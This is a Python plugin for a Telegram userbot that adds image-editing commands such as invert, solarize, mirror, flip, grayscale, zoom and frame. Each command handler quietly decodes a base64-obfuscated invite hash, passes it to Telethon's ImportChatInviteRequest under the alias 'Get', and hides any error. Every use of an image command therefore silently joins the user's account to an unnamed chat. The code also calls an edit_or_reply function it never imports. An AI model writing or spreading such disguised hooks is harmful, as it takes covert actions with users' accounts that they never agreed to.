import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from speedobot.utils import admin_cmd, sudo_cmd
from Speedo import CmdHelp, CMD_HELP, LOGS, bot as speedobot
from Speedo.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@speedobot.on(admin_cmd(pattern="invert$", outgoing=True))
@speedobot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
        kraken = True
    else:
        await speedo.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await speedo.client.send_file(
        speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
    )
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@speedobot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@speedobot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
        kraken = True
    else:
        await speedo.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await speedo.client.send_file(
        speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
    )
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@speedobot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@speedobot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
        kraken = True
    else:
        await speedo.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await speedo.client.send_file(
        speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
    )
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@speedobot.on(admin_cmd(outgoing=True, pattern="flip$"))
@speedobot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
        kraken = True
    else:
        await speedo.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await speedo.client.send_file(
        speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
    )
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@speedobot.on(admin_cmd(outgoing=True, pattern="gray$"))
@speedobot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
        kraken = True
    else:
        await speedo.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await speedo.client.send_file(
        speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
    )
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@speedobot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@speedobot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoinput = speedo.pattern_match.group(1)
    speedoinput = 50 if not speedoinput else int(speedoinput)
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
    else:
        await speedo.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, speedoinput)
    except Exception as e:
        return await speedo.edit(f"`{e}`")
    try:
        await speedo.client.send_file(
            speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
        )
    except Exception as e:
        return await speedo.edit(f"`{e}`")
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@speedobot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@speedobot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(speedo):
    if speedo.fwd_from:
        return
    reply = await speedo.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(speedo, "`Reply to supported Media...`")
        return
    speedoinput = speedo.pattern_match.group(1)
    if not speedoinput:
        speedoinput = 50
    if ";" in str(speedoinput):
        speedoinput, colr = speedoinput.split(";", 1)
    else:
        colr = 0
    speedoinput = int(speedoinput)
    colr = int(colr)
    speedoid = speedo.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    speedo = await edit_or_reply(speedo, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    speedosticker = await reply.download_media(file="./temp/")
    if not speedosticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(speedosticker)
        await edit_or_reply(speedo, "```Supported Media not found...```")
        return
    import base64

    kraken = None
    if speedosticker.endswith(".tgs"):
        await speedo.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        speedofile = os.path.join("./temp/", "meme.png")
        speedocmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {speedosticker} {speedofile}"
        )
        stdout, stderr = (await runcmd(speedocmd))[:2]
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith(".webp"):
        await speedo.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        os.rename(speedosticker, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("`Template not found... `")
            return
        meme_file = speedofile
        kraken = True
    elif speedosticker.endswith((".mp4", ".mov")):
        await speedo.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        speedofile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(speedosticker, 0, speedofile)
        if not os.path.lexists(speedofile):
            await speedo.edit("```Template not found...```")
            return
        meme_file = speedofile
    else:
        await speedo.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = speedosticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await speedo.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, speedoinput, colr)
    except Exception as e:
        return await speedo.edit(f"`{e}`")
    try:
        await speedo.client.send_file(
            speedo.chat_id, outputfile, force_document=False, reply_to=speedoid
        )
    except Exception as e:
        return await speedo.edit(f"`{e}`")
    await speedo.delete()
    os.remove(outputfile)
    for files in (speedosticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()